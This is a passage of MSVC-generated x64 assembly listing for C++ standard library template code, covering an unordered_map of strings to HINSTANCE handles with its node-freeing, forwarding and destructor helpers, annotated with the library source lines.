?dtor$1@?0???$emplace@U?$pair@PEBDPEAUHINSTANCE__@@@std@@@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEAA?AU?$pair@V?$_List_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@_N@1@$$QEAU?$pair@PEBDPEAUHINSTANCE__@@@1@@Z@4HA PROC ; `std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::emplace<std::pair<char const *,HINSTANCE__ *> >'::`1'::dtor$1
	lea	rcx, QWORD PTR _Newnode$3[rdx]
	jmp	??1?$_Alloc_construct_ptr@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@std@@QEAA@XZ ; std::_Alloc_construct_ptr<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> > >::~_Alloc_construct_ptr<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> > >
?dtor$1@?0???$emplace@U?$pair@PEBDPEAUHINSTANCE__@@@std@@@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEAA?AU?$pair@V?$_List_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@_N@1@$$QEAU?$pair@PEBDPEAUHINSTANCE__@@@1@@Z@4HA ENDP ; `std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::emplace<std::pair<char const *,HINSTANCE__ *> >'::`1'::dtor$1
text$x	ENDS
; Function compile flags: /Ogtpy
;	COMDAT text$x
text$x	SEGMENT
$T1 = 32
_Target$2 = 32
_Newnode$3 = 48
this$dead$ = 128
__$ReturnUdt$ = 136
<_Vals_0>$ = 144
?dtor$0@?0???$emplace@U?$pair@PEBDPEAUHINSTANCE__@@@std@@@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEAA?AU?$pair@V?$_List_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@_N@1@$$QEAU?$pair@PEBDPEAUHINSTANCE__@@@1@@Z@4HA PROC ; `std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::emplace<std::pair<char const *,HINSTANCE__ *> >'::`1'::dtor$0
	lea	rcx, QWORD PTR _Newnode$3[rdx]
	jmp	??1?$_List_node_emplace_op2@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@std@@QEAA@XZ ; std::_List_node_emplace_op2<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> > >::~_List_node_emplace_op2<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> > >
?dtor$0@?0???$emplace@U?$pair@PEBDPEAUHINSTANCE__@@@std@@@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@QEAA?AU?$pair@V?$_List_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@_N@1@$$QEAU?$pair@PEBDPEAUHINSTANCE__@@@1@@Z@4HA ENDP ; `std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::emplace<std::pair<char const *,HINSTANCE__ *> >'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\unordered_map
;	COMDAT ??$_Kfn@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@SAAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@AEBU?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@1@@Z
_TEXT	SEGMENT
_Val$ = 8
??$_Kfn@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@SAAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@AEBU?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@1@@Z PROC ; std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0>::_Kfn<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>, COMDAT

; 55   :         return _Val.first;

	mov	rax, rcx

; 56   :     }

	ret	0
??$_Kfn@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@SAAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@AEBU?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@1@@Z ENDP ; std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0>::_Kfn<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits
;	COMDAT ??$forward@AEBV?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@YAAEBV?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@0@AEBV10@@Z
_TEXT	SEGMENT
_Arg$ = 8
??$forward@AEBV?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@YAAEBV?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@0@AEBV10@@Z PROC ; std::forward<std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > const &>, COMDAT

; 1537 :     return static_cast<_Ty&&>(_Arg);

	mov	rax, rcx

; 1538 : }

	ret	0
??$forward@AEBV?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@YAAEBV?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@0@AEBV10@@Z ENDP ; std::forward<std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > const &>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ??$?0AEBV?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@$$V@?$_Compressed_pair@V?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@V?$_Vector_val@U?$_Simple_types@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@AEBV?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@1@@Z
_TEXT	SEGMENT
this$ = 8
__formal$dead$ = 16
_Val1$dead$ = 24
??$?0AEBV?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@$$V@?$_Compressed_pair@V?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@V?$_Vector_val@U?$_Simple_types@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@AEBV?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@1@@Z PROC ; std::_Compressed_pair<std::allocator<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > >,std::_Vector_val<std::_Simple_types<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > > >,1>::_Compressed_pair<std::allocator<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > >,std::_Vector_val<std::_Simple_types<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > > >,1><std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > const &>, COMDAT
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector

; 400  :     _CONSTEXPR20 _Vector_val() noexcept : _Myfirst(), _Mylast(), _Myend() {}

	xor	eax, eax
	mov	QWORD PTR [rcx], rax
	mov	QWORD PTR [rcx+8], rax
	mov	QWORD PTR [rcx+16], rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 1501 :         : _Ty1(_STD forward<_Other1>(_Val1)), _Myval2(_STD forward<_Other2>(_Val2)...) {}

	mov	rax, rcx
	ret	0
??$?0AEBV?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@$$V@?$_Compressed_pair@V?$allocator@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@V?$_Vector_val@U?$_Simple_types@V?$_List_unchecked_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@std@@@std@@@2@$00@std@@QEAA@U_One_then_variadic_args_t@1@AEBV?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@1@@Z ENDP ; std::_Compressed_pair<std::allocator<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > >,std::_Vector_val<std::_Simple_types<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > > >,1>::_Compressed_pair<std::allocator<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > >,std::_Vector_val<std::_Simple_types<std::_List_unchecked_iterator<std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > > > > >,1><std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > const &>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
;	COMDAT ??$_Freenode@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@SAXAEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@PEAU01@@Z
_TEXT	SEGMENT
_Al$dead$ = 48
_Ptr$ = 56
??$_Freenode@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@SAXAEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@PEAU01@@Z PROC ; std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *>::_Freenode<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> > >, COMDAT

; 316  :     static void _Freenode(_Alnode& _Al, _Nodeptr _Ptr) noexcept { // destroy all members in _Ptr and deallocate with _Al

$LN110:
	push	rbx
	sub	rsp, 32					; 00000020H
	mov	rbx, rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	mov	rdx, QWORD PTR [rdx+40]
	cmp	rdx, 15

; 4868 :         if (_My_data._Large_mode_engaged()) {

	jbe	SHORT $LN35@Freenode
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	mov	rcx, QWORD PTR [rbx+16]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2643 :         _Al.deallocate(_Old_ptr, _Capacity + 1); // +1 for null terminator

	inc	rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN49@Freenode

; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	r8, QWORD PTR [rcx-8]
	add	rdx, 39					; 00000027H

; 175  : 
; 176  :     // If the following asserts, it likely means that we are performing
; 177  :     // an aligned delete on memory coming from an unaligned allocation.
; 178  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 179  : 
; 180  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 181  :     // in range [_Min_back_shift, _Non_user_size]
; 182  : #ifdef _DEBUG
; 183  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 184  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 185  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 186  : #endif // ^^^ !defined(_DEBUG) ^^^
; 187  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

	sub	rcx, r8

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	lea	rax, QWORD PTR [rcx-8]
	cmp	rax, 31
	ja	SHORT $LN46@Freenode

; 189  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

	mov	rcx, r8
$LN49@Freenode:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
$LN35@Freenode:
	mov	edx, 56					; 00000038H
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4875 :         _My_data._Mysize = 0;

	mov	QWORD PTR [rbx+32], 0
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 258  :         ::operator delete(_Ptr, _Bytes);

	mov	rcx, rbx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4876 :         _My_data._Myres  = _Small_string_capacity;

	mov	QWORD PTR [rbx+40], 15

; 4877 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 4878 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

	mov	BYTE PTR [rbx+16], 0
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list

; 319  :     }

	add	rsp, 32					; 00000020H
	pop	rbx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 258  :         ::operator delete(_Ptr, _Bytes);

	jmp	??3@YAXPEAX_K@Z				; operator delete
$LN46@Freenode:

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN107@Freenode:
??$_Freenode@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@SAXAEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@1@PEAU01@@Z ENDP ; std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *>::_Freenode<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> > >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ??$_Destroy_in_place@PEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@YAXAEAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@0@@Z
_TEXT	SEGMENT
_Obj$dead$ = 8
??$_Destroy_in_place@PEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@YAXAEAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@0@@Z PROC ; std::_Destroy_in_place<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> *>, COMDAT

; 290  :     if constexpr (is_array_v<_Ty>) {
; 291  :         _STD _Destroy_range(_Obj, _Obj + extent_v<_Ty>);
; 292  :     } else {
; 293  :         _Obj.~_Ty();
; 294  :     }
; 295  : }

	ret	0
??$_Destroy_in_place@PEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@YAXAEAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@0@@Z ENDP ; std::_Destroy_in_place<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> *>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits
;	COMDAT ??$forward@U_Zero_then_variadic_args_t@std@@@std@@YA$$QEAU_Zero_then_variadic_args_t@0@AEAU10@@Z
_TEXT	SEGMENT
_Arg$ = 8
??$forward@U_Zero_then_variadic_args_t@std@@@std@@YA$$QEAU_Zero_then_variadic_args_t@0@AEAU10@@Z PROC ; std::forward<std::_Zero_then_variadic_args_t>, COMDAT

; 1537 :     return static_cast<_Ty&&>(_Arg);

	mov	rax, rcx

; 1538 : }

	ret	0
??$forward@U_Zero_then_variadic_args_t@std@@@std@@YA$$QEAU_Zero_then_variadic_args_t@0@AEAU10@@Z ENDP ; std::forward<std::_Zero_then_variadic_args_t>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits
